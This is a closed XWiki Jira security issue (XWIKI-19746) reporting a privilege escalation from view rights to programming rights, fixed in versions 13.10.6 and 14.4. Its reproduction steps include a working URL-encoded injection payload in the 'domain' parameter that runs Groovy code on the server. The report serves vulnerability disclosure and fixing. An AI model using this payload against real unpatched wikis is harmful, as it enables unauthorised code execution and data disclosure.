

[Log in](/login.jsp?os_destination=%2Fbrowse%2FXWIKI-19746)[Skip to main content](#main)[Skip to sidebar](#sidebar)Linked ApplicationsLoadingâ€¦[![XWiki.org JIRA](/s/-65z3d2/930000/8ws80b/_/jira-logo-scaled.png)](https://jira.xwiki.org/secure/MyJiraHome.jspa)

* [Dashboards](/secure/Dashboard.jspa "View and manage your dashboards")
* [Projects](/secure/BrowseProjects.jspa "View recent projects and browse a list of projects")
* [Issues](/issues/ "Search for issues and view recent issues")

* Give feedback to Atlassian
* [Help](https://docs.atlassian.com/jira/jcore-docs-093/ "Help")
  + [Jira Core help](https://docs.atlassian.com/jira/jcore-docs-093/ "Go to the online documentation for Jira Core")
  + [Keyboard Shortcuts](/secure/ViewKeyboardShortcuts%21default.jspa "Get more information about Jira's Keyboard Shortcuts")
  + [About Jira](/secure/AboutPage.jspa "Get more information about Jira")
  + [Jira Credits](/secure/credits/AroundTheWorld%21default.jspa "See who did what")
* [Log In](/login.jsp?os_destination=%2Fbrowse%2FXWIKI-19746)

![Uploaded image for project: 'XWiki Platform'](https://jira.xwiki.org/secure/projectavatar?pid=10010&avatarId=13602)

1. [XWiki Platform](/browse/XWIKI)
2. [XWIKI-19746](/browse/XWIKI-19746)

# Privilege escalation (PR) with view rights on XWiki.XWikiServerClassSheet

[Log In](/login.jsp?os_destination=%2Fbrowse%2FXWIKI-19746 "Log In")ClosedExportnull

XMLWordPrintable
#### Details

* **Type:**
  ![](/secure/viewavatar?size=xsmall&avatarId=13503&avatarType=issuetype "Bug - A problem which impairs or prevents the functions of the product.") Bug
* **Resolution:**
  Fixed
* **Priority:**
  ![](/images/icons/priorities/blocker.svg "Blocker - Blocks development and/or testing work, production could not run.") Blocker
* **Fix Version/s:**
  [13.10.6](/issues/?jql=project+%3D+XWIKI+AND+fixVersion+%3D+13.10.6 "13.10.6 "), [14.4](/issues/?jql=project+%3D+XWIKI+AND+fixVersion+%3D+14.4 "14.4 ")
* **Affects Version/s:**
  5.3-milestone-2
* **Component/s:**
  [Wiki](/issues/?jql=project+%3D+XWIKI+AND+component+%3D+Wiki "Wiki ")
* **Labels:**
  + [attack\_dataleak](/issues/?jql=labels+%3D+attack_dataleak "attack_dataleak")
  + [attack\_escalation](/issues/?jql=labels+%3D+attack_escalation "attack_escalation")
  + [attacker\_view](/issues/?jql=labels+%3D+attacker_view "attacker_view")
  + [security](/issues/?jql=labels+%3D+security "security")

* **Development Priority:**
  High
* **Difficulty:**
  Unknown
* **Documentation:**
  <https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-xr6m-2p4m-jvqf>
* **Documentation in Release Notes:**
  N/A
* **Similar issues:**

#### Description

**Steps to reproduce:**

1. Get the form token (attribute data-xwiki-form-token on any page).
2. Open the URL <server>/xwiki/bin/view/Main/?sheet=XWiki.XWikiServerClassSheet&form\_token=<form\_token>&action=delete&domain=foo%22%2F%7D%7D%7B%7Basync%20async%3D%22true%22%20cached%3D%22false%22%20context%3D%22doc.reference%22%7D%7D%7B%7Bgroovy%7D%7Dprintln(%22hello%20from%20groovy!%22)%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D, where <server> is the server of the XWiki installation and <form\_token> is the form token you obtained in the first step.

**Expected result:**

The message "Wiki alias "foo"/}}async async="true" cached="false" context="doc.reference"groovy}}println("hello from groovy!"){{/groovy/async" does not exists." is displayed (or any other error message).

**Actual result:**

The message "Wiki alias "foo" does not exists.hello from groovy!"/}}" is displayed, or in other words, the Groovy code has been executed.

This demonstrates a privilege escalation from just view rights on XWiki.XWikiServerClassSheet and a single other document (in this example, it is the main page, it can be any other page) to programming rights. As the result of the macro execution is displayed, this can not only be used to modify the wiki but also quite easily to disclose all information in the wiki without modifying it.

The affects version is only the version on which I reproduced the issue, this is very likely much older.

#### Attachments

#### Issue Links

is caused by

![Improvement - An improvement or enhancement to an existing feature or task.](/secure/viewavatar?size=xsmall&avatarId=13510&avatarType=issuetype "Improvement - An improvement or enhancement to an existing feature or task.")
[XWIKI-9516](/browse/XWIKI-9516)
Create a new Wiki API that replaces xwiki-platform-wiki-manager and xwiki-platform-workspace

* ![Major - Major loss of function.](/images/icons/priorities/major.svg "Major - Major loss of function.")
* Closed

relates to

![Bug - A problem which impairs or prevents the functions of the product.](/secure/viewavatar?size=xsmall&avatarId=13503&avatarType=issuetype "Bug - A problem which impairs or prevents the functions of the product.")
[XWIKI-19757](/browse/XWIKI-19757)
Possible wiki injection through translation macro parameters located in FlamingoThemesCode.WebHomeSheet

* ![Blocker - Blocks development and/or testing work, production could not run.](/images/icons/priorities/blocker.svg "Blocker - Blocks development and/or testing work, production could not run.")
* Closed

links to

![Web Link](https://github.com/favicon.ico "Web Link")
[GitHub Security advisory](https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-xr6m-2p4m-jvqf)

#### Activity

#### People

Assignee:

![MichaelHamann](https://jira.xwiki.org/secure/useravatar?size=small&avatarId=10222)
Michael Hamann

Reporter:

![MichaelHamann](https://jira.xwiki.org/secure/useravatar?size=small&avatarId=10222)
Michael Hamann

Votes:
0
Vote for this issue

Watchers:
1
Start watching this issue

#### Dates

Created:

19/May/22 16:49

Updated:

08/Sep/22 14:26

Resolved:

23/May/22 11:53

* Atlassian Jira [Project Management Software](https://www.atlassian.com/software/jira)
* [About Jira](/secure/AboutPage.jspa/secure/AboutPage.jspa)
* [Report a problem](/secure/CreateIssue%21default.jspa)

Powered by a free Atlassian [Jira](http://www.atlassian.com/software/jira) open source license for XWiki.org. Try Jira - [bug tracking software](http://www.atlassian.com/software/jira) for *your* team.

[Atlassian](http://www.atlassian.com/)

